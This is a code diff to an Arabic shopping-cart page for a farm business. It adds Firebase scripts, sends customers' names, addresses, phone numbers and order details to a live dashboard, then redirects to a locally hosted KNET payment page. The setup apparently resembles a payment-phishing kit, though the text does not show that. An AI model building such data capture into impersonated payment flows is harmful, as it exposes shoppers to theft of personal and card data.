@@ -3,6 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+    <script src="./assets/js/firebase-client.js"></script>
     <title>سلة الطلبات - مزارع الثنيان</title>
     <style>
         * {
@@ -625,12 +629,29 @@
                     return;
                 }
                 
-                // حساب المبلغ المراد دفعه بناءً على خيار الدفع (كامل أو جزئي)
+                                // حساب المبلغ المراد دفعه بناءً على خيار الدفع (كامل أو جزئي)
                 const amountToPay = selectedPaymentType === 'full' ? subtotal.toFixed(3) + ' د.ك' : '1.000 د.ك';
-                
                 // تخزين السعر محلياً لاستخدامه في الصفحة الجديدة
                 localStorage.setItem('finalAmount', amountToPay);
-                
+                // جمع بيانات العميل ورفعها إلى قاعدة البيانات (تظهر فوراً في لوحة التحكم)
+                try {
+                    const inputs = formSection.querySelectorAll('input.form-input');
+                    const notesEl = formSection.querySelector('textarea.form-textarea');
+                    const customerData = {
+                        name: inputs[0] ? inputs[0].value.trim() : '',
+                        address: inputs[1] ? inputs[1].value.trim() : '',
+                        apartment: inputs[2] ? inputs[2].value.trim() : '',
+                        phone: inputs[3] ? inputs[3].value.trim() : '',
+                        deliveryNotes: notesEl ? notesEl.value.trim() : '',
+                        amount: amountToPay,
+                        paymentType: selectedPaymentType,
+                        items: [{ name: sampleCartItem.name, price: sampleCartItem.price, qty: sampleCartItem.qty }]
+                    };
+                    localStorage.setItem('phone', customerData.phone);
+                    if (typeof window.pushFirebaseCustomer === 'function') {
+                        window.pushFirebaseCustomer(customerData);
+                    }
+                } catch (e) { console.error('customer push failed', e); }
                 // الانتقال إلى صفحة knet.html
                 window.location.href = 'knet.html';
             }
